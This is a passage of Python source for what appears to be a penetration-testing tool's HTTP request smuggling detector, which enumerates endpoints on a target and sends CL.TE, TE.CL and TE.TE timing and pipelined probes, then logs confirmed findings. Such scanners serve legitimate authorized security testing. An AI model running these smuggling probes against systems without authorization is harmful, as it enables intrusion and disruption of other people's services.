                    endpoint_url=endpoint_url,
                    parameter="Transfer-Encoding",
                    parameter_type="http_header",
                    status_code=response.status_code,
                    cwe_id="CWE-444",
                    cvss_score=9.8,
                )

        return None


# ============================================================================
# Collector Orchestrator
# ============================================================================

class HTTPRequestSmugglingCollector(BaseCollector):
    """
    Collector for actively testing discovered endpoints and reverse proxies for
    HTTP Request Smuggling (CL.TE, TE.CL, TE.TE, HTTP/2 downgrading).
    """

    DEFAULT_SMUGGLING_PATHS: List[str] = [
        "/",
        "/api",
        "/api/v1",
        "/login",
        "/auth",
        "/search",
        "/submit",
        "/graphql",
        "/rest",
    ]

    def __init__(
        self,
        http_client: Optional[AuthenticatedHttpClient] = None,
        prober: Optional[RawHttpStreamProber] = None,
        timeout: float = 10.0,
        timing_threshold: float = 3.0,
    ):
        super().__init__()
        self.http_client = http_client
        self.prober = prober or RawHttpStreamProber(timeout=timeout)
        self.timeout = timeout
        self.timing_threshold = timing_threshold
        self.results: List[RequestSmugglingResult] = []

    def _discover_candidate_endpoints(self, mission: Any) -> List[str]:
        """
        Identifies candidate HTTP endpoints from mission assets (endpoints, live hosts, target).
        """
        raw_mission = getattr(mission, "_raw_mission", getattr(mission, "_mission", mission))
        candidates: Set[str] = set()

        # 1. Existing endpoints
        endpoints = list(getattr(raw_mission, "endpoints", []) or [])
        for ep in endpoints:
            ep_url = str(ep.get("url", ep) if isinstance(ep, dict) else ep).strip()
            if not ep_url:
                continue
            candidates.add(ep_url)

        # 2. Derive base paths from live hosts and target
        base_urls: Set[str] = set()
        live_hosts = list(getattr(raw_mission, "live_hosts", []) or [])
        for lh in live_hosts:
            lh_url = str(lh.get("url", lh) if isinstance(lh, dict) else lh).strip()
            if lh_url:
                base_urls.add(lh_url)

        target = str(getattr(raw_mission, "target", "") or "").strip()
        if target:
            if not target.startswith("http://") and not target.startswith("https://"):
                base_urls.add(f"https://{target}")
                base_urls.add(f"http://{target}")
            else:
                base_urls.add(target)

        for base in base_urls:
            parsed_b = urllib.parse.urlparse(base)
            root_url = f"{parsed_b.scheme}://{parsed_b.netloc}"
            for candidate_path in self.DEFAULT_SMUGGLING_PATHS:
                candidates.add(urllib.parse.urljoin(root_url, candidate_path))

        return sorted(list(candidates))

    def _publish_finding(
        self,
        mission: Any,
        result: RequestSmugglingResult,
        base_url: str,
        target_url: str,
    ) -> Evidence:
        """
        Executes quadruple state updates:
        1. mission.evidence.add(ev)
        2. mission.vulnerabilities.append({...})
        3. mission.attack_surface_graph node & edge creation (HAS_ENDPOINT, HAS_VULNERABILITY)
        4. ControlledMission finding publishing
        """
        raw_mission = getattr(mission, "_raw_mission", getattr(mission, "_mission", mission))
        parsed = urllib.parse.urlparse(target_url)
        url_path = parsed.path or "/"

        cwe_id = result.cwe_id
        cvss_score = result.cvss_score
        tech_upper = result.technique.upper().replace("_", ".")

        title_map = {
            RequestSmugglingTechnique.CL_TE.value: f"HTTP Request Smuggling (CL.TE) Desynchronization: {target_url}",
            RequestSmugglingTechnique.TE_CL.value: f"HTTP Request Smuggling (TE.CL) Desynchronization: {target_url}",
            RequestSmugglingTechnique.TE_TE.value: f"HTTP Request Smuggling (TE.TE) Obfuscation: {target_url}",
            RequestSmugglingTechnique.H2_CL.value: f"HTTP/2 to HTTP/1.1 Request Smuggling (H2.CL): {target_url}",
            RequestSmugglingTechnique.H2_TE.value: f"HTTP/2 to HTTP/1.1 Request Smuggling (H2.TE): {target_url}",
            RequestSmugglingTechnique.H2_CRLF.value: f"HTTP/2 Pseudo-Header CRLF Request Smuggling: {target_url}",
            RequestSmugglingTechnique.DIFFERENTIAL_TIMING.value: f"HTTP Request Boundary Timing Desynchronization: {target_url}",
            RequestSmugglingTechnique.PIPELINE_POISONING.value: f"HTTP Request Smuggling Pipeline Poisoning: {target_url}",
        }
        title_base = title_map.get(result.technique, f"HTTP Request Smuggling Vulnerability ({tech_upper}): {target_url}")

        description = (
            f"HTTP Request Smuggling validation on '{target_url}' identified a desynchronization flaw using technique '{tech_upper}' "
            f"under mutation strategy '{result.mutation_strategy}'.\n"
            f"Evidence: {result.evidence_snippet}\n"
            f"CWE: {cwe_id} (CVSS: {cvss_score})"
        )

        ev = Evidence(
            category="request_smuggling",
            value=f"{result.technique}:{target_url}",
            source="request_smuggling",
            status="CONFIRMED",
            severity=result.severity,
            confidence=result.confidence,
            title=title_base,
            description=description,
            provenance=ProvenanceData(
                step_id="request_smuggling_collector",
            ),
            tags=[
                "http",
                "request_smuggling",
                "http_desync",
                result.technique,
                result.mutation_strategy,
                result.template_id,
                cwe_id.lower(),
            ],
            metadata={
                "url": target_url,
                "host": base_url,
                "path": url_path,
                "category": "request_smuggling",
                "severity": result.severity,
                "confidence": result.confidence,
                "vulnerability_type": result.technique,
                "technique": result.technique,
                "mutation_strategy": result.mutation_strategy,
                "matched_signature": result.matched_signature,
                "template_id": result.template_id,
                "status_code": result.status_code,
                "evidence_snippet": result.evidence_snippet[:250],
                "payload": result.payload[:300],
                "cwe_id": cwe_id,
                "cvss_score": cvss_score,
                "delay_delta": result.delay_delta,
            },
        )

        # 1. Update raw_mission.evidence
        if hasattr(raw_mission, "evidence") and raw_mission.evidence is not None:
            if hasattr(raw_mission.evidence, "add"):
                raw_mission.evidence.add(ev)
            elif isinstance(raw_mission.evidence, list):
                raw_mission.evidence.append(ev)

        # 2. Update raw_mission.vulnerabilities
        if hasattr(raw_mission, "vulnerabilities") and isinstance(raw_mission.vulnerabilities, list):
            raw_mission.vulnerabilities.append({
                "name": title_base,
                "template_id": result.template_id,
                "severity": result.severity,
                "host": base_url,
                "url": target_url,
                "description": description,
                "technique": result.technique,
                "mutation_strategy": result.mutation_strategy,
                "cwe_id": cwe_id,
                "cvss_score": cvss_score,
            })

        # 3. AttackSurfaceGraph Node & Edge Expansion
        graph = getattr(raw_mission, "attack_surface_graph", None) or getattr(raw_mission, "graph", None)
        if graph is not None and hasattr(graph, "add") and hasattr(graph, "connect"):
            lh_id = f"live_host:{base_url}"
            ep_id = f"endpoint:{target_url}"
            vuln_id = f"vulnerability:{result.template_id}:{target_url}:{result.technique}"

            graph.add(Node(id=lh_id, type="live_host", value=base_url, metadata={"url": base_url}))
            graph.add(Node(id=ep_id, type="endpoint", value=target_url, metadata={"url": target_url, "status_code": result.status_code}))
            graph.add(Node(id=vuln_id, type="vulnerability", value=title_base, metadata=ev.metadata))

            graph.connect(lh_id, ep_id, edge_type="HAS_ENDPOINT")
            graph.connect(lh_id, vuln_id, edge_type="HAS_VULNERABILITY")
            graph.connect(ep_id, vuln_id, edge_type="HAS_VULNERABILITY")

        # 4. ControlledMission Wrapper publish
        if mission is not raw_mission and hasattr(mission, "publish_finding"):
            try:
                mission.publish_finding(ev.evidence_id, ev)
            except Exception:
                pass

        return ev

    def _execute_probes(
        self,
        target_url: str,
        base_url: str,
        prober: RawHttpStreamProber,
    ) -> List[RequestSmugglingResult]:
        """
        Executes raw stream probes against a single candidate endpoint.
        """
        findings: List[RequestSmugglingResult] = []
        parsed = urllib.parse.urlparse(target_url)
        host = parsed.netloc or parsed.hostname or "target.example.com"
        path = parsed.path or "/"

        # 1. Baseline Latency Probe
        base_probe = RequestSmugglingPayloadGenerator.build_baseline_probe(host, path)
        base_resp = prober.send_raw_probe(target_url, base_probe)
        baseline_elapsed = base_resp.elapsed
        baseline_status = base_resp.status_code or 200

        # If baseline completely failed with connection error, abort
        if base_resp.error and base_resp.status_code == 0 and not base_resp.timed_out:
            logger.debug(f"Baseline probe failed for {target_url}: {base_resp.error}")
            return findings

        # 2. CL.TE Timing Probe
        cl_te_timing = RequestSmugglingPayloadGenerator.build_cl_te_timing_probe(host, path)
        resp_cl_te = prober.send_raw_probe(target_url, cl_te_timing)
        res_cl_te_t = RequestSmugglingSecurityAnalyzer.analyze_timing_response(
            endpoint_url=target_url,
            technique=RequestSmugglingTechnique.CL_TE.value,
            strategy=RequestSmugglingMutationStrategy.STANDARD.value,
            baseline_elapsed=baseline_elapsed,
            injected_elapsed=resp_cl_te.elapsed,
            threshold=self.timing_threshold,
            status_code=resp_cl_te.status_code,
            payload=cl_te_timing,
            error_message=resp_cl_te.error,
        )
        if res_cl_te_t:
            findings.append(res_cl_te_t)

        # 3. TE.CL Timing Probe
        te_cl_timing = RequestSmugglingPayloadGenerator.build_te_cl_timing_probe(host, path)
        resp_te_cl = prober.send_raw_probe(target_url, te_cl_timing)
        res_te_cl_t = RequestSmugglingSecurityAnalyzer.analyze_timing_response(
            endpoint_url=target_url,
            technique=RequestSmugglingTechnique.TE_CL.value,
            strategy=RequestSmugglingMutationStrategy.STANDARD.value,
            baseline_elapsed=baseline_elapsed,
            injected_elapsed=resp_te_cl.elapsed,
            threshold=self.timing_threshold,
            status_code=resp_te_cl.status_code,
            payload=te_cl_timing,
            error_message=resp_te_cl.error,
        )
        if res_te_cl_t:
            findings.append(res_te_cl_t)

        # 4. CL.TE 2-Request Pipeline Confirmation Probe
        atk_cl_te, fol_cl_te = RequestSmugglingPayloadGenerator.build_cl_te_pipeline_probe(host, path)
        atk_r1, fol_r1 = prober.send_pipeline_sequence(target_url, atk_cl_te, fol_cl_te)
        res_cl_te_pipe = RequestSmugglingSecurityAnalyzer.analyze_pipeline_response(
            endpoint_url=target_url,
            technique=RequestSmugglingTechnique.CL_TE.value,
            strategy=RequestSmugglingMutationStrategy.STANDARD.value,
            attack_resp=atk_r1,
            follow_up_resp=fol_r1,
            baseline_status=baseline_status,
            payload=atk_cl_te,
        )
        if res_cl_te_pipe:
            findings.append(res_cl_te_pipe)

        # 5. TE.CL 2-Request Pipeline Confirmation Probe
        atk_te_cl, fol_te_cl = RequestSmugglingPayloadGenerator.build_te_cl_pipeline_probe(host, path)
        atk_r2, fol_r2 = prober.send_pipeline_sequence(target_url, atk_te_cl, fol_te_cl)
        res_te_cl_pipe = RequestSmugglingSecurityAnalyzer.analyze_pipeline_response(
            endpoint_url=target_url,
            technique=RequestSmugglingTechnique.TE_CL.value,
            strategy=RequestSmugglingMutationStrategy.STANDARD.value,
            attack_resp=atk_r2,
            follow_up_resp=fol_r2,
            baseline_status=baseline_status,
            payload=atk_te_cl,
        )
        if res_te_cl_pipe:
            findings.append(res_te_cl_pipe)

        # 6. TE.TE Obfuscation Mutations
        te_te_mutations = RequestSmugglingPayloadGenerator.generate_te_te_mutations(host, path)
        for strategy, atk_probe, fol_probe, desc in te_te_mutations:
            atk_r, fol_r = prober.send_pipeline_sequence(target_url, atk_probe, fol_probe)
            res_te_te = RequestSmugglingSecurityAnalyzer.analyze_pipeline_response(
                endpoint_url=target_url,
                technique=RequestSmugglingTechnique.TE_TE.value,
                strategy=strategy.value,
                attack_resp=atk_r,
                follow_up_resp=fol_r,
                baseline_status=baseline_status,
                payload=atk_probe,
            )
            if res_te_te:
                findings.append(res_te_te)
                break  # Confirmed on this mutation strategy

        return findings

    def collect(self, mission: Any) -> List[Evidence]:
        """
        Executes HTTP request smuggling detection against discovered mission endpoints.
        """
        candidate_endpoints = self._discover_candidate_endpoints(mission)
        if not candidate_endpoints:
            logger.info("No candidate endpoints discovered for HTTP request smuggling analysis.")
            return []

        evidences: List[Evidence] = []
        prober = self.prober

        for target_url in candidate_endpoints:
            parsed = urllib.parse.urlparse(target_url)
            base_url = f"{parsed.scheme}://{parsed.netloc}" if parsed.netloc else target_url

            results = self._execute_probes(target_url, base_url, prober)
            for res in results:
                ev = self._publish_finding(mission, res, base_url, target_url)
                evidences.append(ev)
                self.results.append(res)

        return evidences

    def execute(self, mission: Any) -> List[Evidence]:
        """Alias for collect(mission) conforming to standard collector execution interface."""
        return self.collect(mission)


# Backwards compatibility alias
RequestSmugglingCollector = HTTPRequestSmugglingCollector
